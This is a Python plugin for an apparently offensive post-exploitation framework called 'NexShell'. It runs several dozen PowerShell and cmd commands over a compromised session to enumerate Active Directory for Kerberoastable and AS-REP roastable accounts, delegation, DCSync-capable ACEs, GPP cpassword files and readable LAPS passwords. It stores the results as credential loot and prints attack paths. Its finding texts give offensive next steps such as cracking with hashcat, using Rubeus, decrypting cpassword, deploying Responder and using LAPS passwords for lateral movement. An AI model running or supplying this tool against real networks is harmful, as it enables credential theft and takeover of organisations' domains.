#!/usr/bin/env python3
"""
NexShell Plugin — Active Directory Attack Suite  (plugins/ad_attack.py)
Active Directory enumeration and vulnerability detection.

Coverage:
  - Domain Controller & Forest discovery
  - Kerberoasting (SPN enumeration)
  - AS-REP Roasting (accounts without pre-auth)
  - Kerberos delegation (Unconstrained/Constrained/Resource-Based)
  - ACL/ACE misconfigurations (GenericAll, WriteDACL, DCSync rights)
  - GPO enumeration & GPP password exposure
  - LAPS configuration
  - Password policy analysis (spraying feasibility)
  - AdminSDHolder & Protected Users analysis
  - Exchange misconfigurations (EWS, Exchange Windows Permissions)
  - NTLM relay attack surface (LLMNR/NBT-NS/WPAD)
  - BloodHound-style path indicators
  - Trust relationships & SID history abuse
  - Machine account quota (MAQ)
  - Dangerous default permissions

Usage:
    (NexShell)> plugins run ad-attack
    (NexShell)> plugins run ad-attack --enumerate-only
    (NexShell)> plugins run ad-attack --kerberoast
"""

import re
from core.plugin import NexPlugin


class ADAttack(NexPlugin):
    name        = "ad-attack"
    description = "Active Directory attack suite — Kerberoast/ASREPRoast/ACL/Delegation/GPP"
    author      = "vulnquest58"
    version     = "1.0"
    platform    = "windows"
    category    = "lateral"
    mitre_id    = "T1558"

    # ── Enumeration commands ──────────────────────────────────────────────────
    ENUM_CHECKS = [
        # Domain basics
        ("echo %USERDOMAIN% & echo %LOGONSERVER%",
         "domain_info", "Domain & DC Info"),
        ("powershell -c \"Get-ADDomain | Select-Object DNSRoot,NetBIOSName,DomainMode,InfrastructureMaster | Format-List\"",
         "ad_domain", "AD Domain Info"),
        ("powershell -c \"(Get-ADForest).Domains\"",
         "ad_forest_domains", "AD Forest Domains"),
        ("powershell -c \"Get-ADTrust -Filter * | Select-Object Name,Direction,TrustType,SIDFilteringQuarantined | Format-Table\"",
         "ad_trusts", "AD Trust Relationships"),
        ("powershell -c \"Get-ADDomainController -Filter * | Select-Object Name,IPv4Address,OperatingSystem,IsGlobalCatalog | Format-Table\"",
         "ad_dcs", "Domain Controllers"),
        ("nltest /dclist: 2>nul",
         "nltest_dclist", "DC List (nltest)"),

        # Users
        ("powershell -c \"Get-ADUser -Filter * -Properties * | Select-Object SamAccountName,Enabled,PasswordNeverExpires,DoesNotRequirePreAuth,SIDHistory,AdminCount | Format-Table\"",
         "ad_users", "All AD Users"),
        ("powershell -c \"Get-ADUser -Filter {AdminCount -eq 1} | Select-Object SamAccountName,DistinguishedName | Format-Table\"",
         "ad_admin_users", "AdminCount=1 Users"),
        ("powershell -c \"Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select-Object SamAccountName\"",
         "asrep_accounts", "AS-REP Roastable Accounts"),
        ("powershell -c \"Get-ADUser -Filter {PasswordNeverExpires -eq $true} | Select-Object SamAccountName,Enabled | Format-Table\"",
         "pass_never_expire", "Password Never Expires"),
        ("powershell -c \"(Get-Date) - (Get-ADUser -Filter * | Sort-Object PasswordLastSet | Select-Object -First 1 PasswordLastSet).PasswordLastSet\"",
         "oldest_password", "Oldest Password Age"),

        # Groups
        ("powershell -c \"Get-ADGroup -Filter * | Measure-Object | Select Count\"",
         "ad_group_count", "AD Group Count"),
        ("powershell -c \"Get-ADGroupMember 'Domain Admins' | Select-Object SamAccountName,objectClass | Format-Table\"",
         "domain_admins", "Domain Admins Members"),
        ("powershell -c \"Get-ADGroupMember 'Enterprise Admins' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "enterprise_admins", "Enterprise Admins"),
        ("powershell -c \"Get-ADGroupMember 'Schema Admins' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "schema_admins", "Schema Admins"),
        ("powershell -c \"Get-ADGroupMember 'Account Operators' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "account_operators", "Account Operators"),

        # Kerberoasting
        ("powershell -c \"Get-ADUser -Filter {ServicePrincipalName -like '*'} -Properties ServicePrincipalName | Select-Object SamAccountName,ServicePrincipalName | Format-Table\"",
         "spns", "SPN Accounts (Kerberoastable)"),
        ("powershell -c \"Get-ADComputer -Filter {ServicePrincipalName -like 'MSSQLSvc*'} | Select-Object Name,ServicePrincipalName\"",
         "mssql_spns", "MSSQL SPNs"),

        # Delegation
        ("powershell -c \"Get-ADComputer -Filter {TrustedForDelegation -eq $true} | Select-Object Name,DNSHostName\"",
         "unconstrained_delegation_computers", "Unconstrained Delegation (Computers)"),
        ("powershell -c \"Get-ADUser -Filter {TrustedForDelegation -eq $true} | Select-Object SamAccountName\"",
         "unconstrained_delegation_users", "Unconstrained Delegation (Users)"),
        ("powershell -c \"Get-ADObject -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo | Select-Object Name,'msDS-AllowedToDelegateTo'\"",
         "constrained_delegation", "Constrained Delegation"),
        ("powershell -c \"Get-ADObject -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} | Select-Object Name,DistinguishedName\"",
         "rbcd", "Resource-Based Constrained Delegation (RBCD)"),

        # Password policy
        ("powershell -c \"Get-ADDefaultDomainPasswordPolicy | Select-Object MinPasswordLength,LockoutThreshold,LockoutObservationWindow,MaxPasswordAge | Format-List\"",
         "password_policy", "Domain Password Policy"),
        ("powershell -c \"Get-ADFineGrainedPasswordPolicy -Filter * | Select-Object Name,MinPasswordLength,LockoutThreshold | Format-Table\"",
         "fine_grained_pso", "Fine-Grained Password Policies"),

        # GPO & GPP
        ("powershell -c \"Get-GPO -All | Select-Object DisplayName,GpoStatus,Id | Format-Table\"",
         "gpos", "Group Policy Objects"),
        ("powershell -c \"Get-ChildItem '\\\\$env:USERDNSDOMAIN\\SYSVOL' -Recurse -Filter 'Groups.xml' -ErrorAction SilentlyContinue | Select FullName\"",
         "gpp_xml", "GPP Groups.xml (cpassword)"),
        ("dir /s /b \\\\%USERDNSDOMAIN%\\SYSVOL\\*.xml 2>nul | findstr /i groups",
         "gpp_files_cmd", "GPP XML Files (cmd)"),

        # LAPS
        ("powershell -c \"Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} | Select-Object Name,'ms-Mcs-AdmPwd'\"",
         "laps_passwords", "LAPS Passwords (if readable)"),
        ("powershell -c \"Get-ADObject -SearchBase 'CN=Schema,CN=Configuration,DC=X' -Filter {lDAPDisplayName -like 'ms-mcs-admpwd'} -ErrorAction SilentlyContinue\"",
         "laps_schema", "LAPS Schema Attribute"),

        # Machine account quota
        ("powershell -c \"(Get-ADDomain).DistinguishedName | ForEach-Object {(Get-ADObject $_ -Properties ms-DS-MachineAccountQuota).'ms-DS-MachineAccountQuota'}\"",
         "machine_quota", "Machine Account Quota (ms-DS-MachineAccountQuota)"),

        # Protected Users
        ("powershell -c \"Get-ADGroupMember 'Protected Users' | Select-Object SamAccountName\"",
         "protected_users", "Protected Users Group"),

        # AdminSDHolder
        ("powershell -c \"Get-ADObject 'CN=AdminSDHolder,CN=System,$(Get-ADDomain)' -Properties nTSecurityDescriptor | Select-Object nTSecurityDescriptor\"",
         "adminsdholder", "AdminSDHolder Permissions"),

        # LLMNR / NBT-NS (relay attack surface)
        ("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Parameters /v EnableMulticast",
         "llmnr_status", "LLMNR Status"),
        ("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters /v NodeType",
         "nbtns_status", "NBT-NS Status"),
        ("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttpAutoProxySvc",
         "wpad_status", "WPAD Service Status"),

        # DCSync capable accounts
        ("powershell -c \"(Get-ACL 'AD:$(Get-ADDomain)').Access | Where-Object {$_.ActiveDirectoryRights -like '*GenericAll*' -or $_.ActiveDirectoryRights -like '*WriteDACL*' -or ($_.ObjectType -like '*1131f6ad*') -or ($_.ObjectType -like '*1131f6aa*')} | Format-Table\"",
         "dcsync_acl", "DCSync-capable ACEs"),

        # Exchange
        ("powershell -c \"Get-ADGroup -Identity 'Exchange Windows Permissions' -Properties Members | Select-Object -ExpandProperty Members\"",
         "exchange_windows_perms", "Exchange Windows Permissions Group"),
        ("powershell -c \"Get-ADUser -Filter * -Properties memberof | Where-Object {$_.memberof -like '*Exchange*'} | Select-Object SamAccountName | Select-Object -First 20\"",
         "exchange_members", "Exchange Group Members"),

        # SID History
        ("powershell -c \"Get-ADUser -Filter {SIDHistory -like '*'} -Properties SIDHistory | Select-Object SamAccountName,SIDHistory\"",
         "sid_history", "SID History (Privilege Abuse)"),

        # Computers
        ("powershell -c \"Get-ADComputer -Filter * -Properties OperatingSystem | Group-Object OperatingSystem | Select-Object Name,Count | Sort-Object Count -Descending\"",
         "os_breakdown", "OS Breakdown"),
        ("powershell -c \"Get-ADComputer -Filter {OperatingSystem -like '*2003*' -or OperatingSystem -like '*XP*' -or OperatingSystem -like '*Vista*'} | Select-Object Name,OperatingSystem\"",
         "legacy_os", "Legacy OS (EOL)"),
    ]

    # ── Auto-finding patterns ─────────────────────────────────────────────────
    FINDING_PATTERNS = {
        "asrep_accounts": [
            (r"\w",
             "High", "AS-REP Roastable Accounts Found",
             "These accounts don't require Kerberos pre-authentication. Request AS-REP and crack offline with hashcat (-m 18200). Enable pre-auth on all accounts."),
        ],
        "spns": [
            (r"SamAccountName",
             "High", "Kerberoastable Accounts (SPNs) Found",
             "Request Kerberos TGS tickets for these accounts and crack offline. Use: Invoke-Kerberoast or Rubeus kerberoast. Set strong passwords (25+ chars) on service accounts."),
        ],
        "unconstrained_delegation_computers": [
            (r"\w",
             "Critical", "Unconstrained Delegation Computers Detected",
             "Any computer with unconstrained delegation will cache TGTs of connecting users. Compromise + force DC authentication = DCSync. Use Rubeus monitor+tgtdeleg."),
        ],
        "unconstrained_delegation_users": [
            (r"\w",
             "Critical", "Unconstrained Delegation Users Detected",
             "User accounts with unconstrained delegation can impersonate any user. Immediate risk — disable unconstrained delegation."),
        ],
        "constrained_delegation": [
            (r"\w",
             "High", "Constrained Delegation Found",
             "Constrained delegation allows service impersonation for specific targets. May allow TGS tickets forging (S4U2Self+S4U2Proxy)."),
        ],
        "rbcd": [
            (r"\w",
             "High", "Resource-Based Constrained Delegation (RBCD) Found",
             "RBCD configured — attacker with write access to msDS-AllowedToActOnBehalfOfOtherIdentity can add a machine account and escalate."),
        ],
        "gpp_xml": [
            (r"\S",
             "Critical", "GPP Password Files Found (cpassword)",
             "Groups.xml found in SYSVOL. Decrypt cpassword with: gpp-decrypt <cpassword>. Plaintext passwords recoverable. Patch: MS14-025."),
        ],
        "laps_passwords": [
            (r"ms-Mcs-AdmPwd.*\S",
             "High", "LAPS Passwords Readable",
             "Current user can read LAPS passwords. Use these for lateral movement to specific computers."),
        ],
        "machine_quota": [
            (r"^[1-9]",
             "High", "Machine Account Quota > 0",
             "Domain users can add machines (default quota: 10). Abuse: create machine account, use for RBCD/NTLM relay. Reduce MAQ to 0 if possible."),
        ],
        "dcsync_acl": [
            (r"\w",
             "Critical", "DCSync-Capable ACE Detected",
             "Account has Replication rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All). Can perform DCSync to dump all NTLM hashes."),
        ],
        "llmnr_status": [
            (r"EnableMulticast\s+REG_DWORD\s+0x1|(?!.*EnableMulticast)",
             "High", "LLMNR Enabled (NTLM Relay Risk)",
             "LLMNR is enabled. Deploy Responder to capture NTLMv2 hashes. Disable with Group Policy: Network > DNS Client > Turn off multicast name resolution."),
        ],
        "legacy_os": [
            (r"\w",
             "Critical", "Legacy/EOL Operating Systems in Domain",
             "End-of-life Windows versions found (XP/Vista/2003). No security patches. MS17-010 (EternalBlue) likely applicable."),
        ],
        "sid_history": [
            (r"\w",
             "High", "SID History Detected",
             "SID history can grant privileges from other domains/forests. Verify all SID history attributes are legitimate."),
        ],
        "password_policy": [
            (r"LockoutThreshold\s*:\s*0",
             "High", "No Account Lockout Policy",
             "Account lockout is disabled. Password spraying allowed without lockout risk."),
            (r"MinPasswordLength\s*:\s*[1-7]\b",
             "Medium", "Weak Minimum Password Length",
             "Minimum password length < 8. Weak passwords allowed. Recommend 14+ characters."),
        ],
        "exchange_windows_perms": [
            (r"\w",
             "High", "Exchange Windows Permissions Group Has Members",
             "Members of Exchange Windows Permissions can modify AD ACLs. This can lead to DCSync rights. Classic Exchange PrivExchange path."),
        ],
    }

    def run(self, session, args: list):
        enum_only  = '--enumerate-only' in (args or [])
        kerberoast = '--kerberoast'     in (args or [])

        self.info("Starting ad-attack v1.0 ...")
        sections  = []
        collected = {}

        # Select checks
        checks = self.ENUM_CHECKS

        for cmd, key, label in checks:
            try:
                # Wrap in PowerShell if starts with 'powershell'
                run_cmd = cmd
                out = self._exec(session, run_cmd)
                if not out.strip() or 'The term' in out or 'not recognized' in out:
                    continue

                collected[key] = out
                self.loot(out, category='credentials', source=f"ad-attack:{key}")

                sections.append(f"\n{'━'*64}")
                sections.append(f"  [{label}]")
                sections.append('━'*64)
                sections.append(out.strip()[:600])

            except Exception as e:
                self.warn(f"Check failed [{label}]: {e}")

        # ── Auto-findings ─────────────────────────────────────────────────────
        findings_created = 0
        for key, patterns in self.FINDING_PATTERNS.items():
            text = collected.get(key, '')
            if not text.strip():
                continue
            for pattern, severity, title, recommendation in patterns:
                if re.search(pattern, text, re.MULTILINE | re.IGNORECASE):
                    self.finding(
                        title          = title,
                        description    = f"[{key}]\n\n{text[:500]}",
                        severity       = severity,
                        recommendation = recommendation,
                        mitre_id       = self.mitre_id,
                    )
                    self.emit('finding.created', severity=severity, title=title, plugin=self.name)
                    findings_created += 1

        # ── Generate attack path summary ──────────────────────────────────────
        attack_paths = []
        if collected.get('asrep_accounts', '').strip():
            attack_paths.append("AS-REP Roasting → offline crack → credentials")
        if collected.get('spns', '').strip():
            attack_paths.append("Kerberoasting → offline crack → service account credentials")
        if collected.get('unconstrained_delegation_computers', '').strip():
            attack_paths.append("Unconstrained Delegation + forced auth → TGT theft → DCSync")
        if collected.get('gpp_xml', '').strip():
            attack_paths.append("GPP cpassword → decrypt → plaintext credentials")
        if collected.get('dcsync_acl', '').strip():
            attack_paths.append("DCSync ACE → dump all NTLM hashes")
        if collected.get('machine_quota', '').strip() and re.search(r'^[1-9]', collected.get('machine_quota', '')):
            attack_paths.append("MAQ > 0 → create machine account → RBCD/NTLM relay")

        if attack_paths:
            sections.append(f"\n{'═'*64}")
            sections.append("  [!] Attack Paths Identified:")
            for path in attack_paths:
                sections.append(f"  ► {path}")

        self.info(f"ad-attack complete — {findings_created} findings, {len(attack_paths)} attack paths.")
        return '\n'.join(sections) if sections else "No AD data collected."

    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''
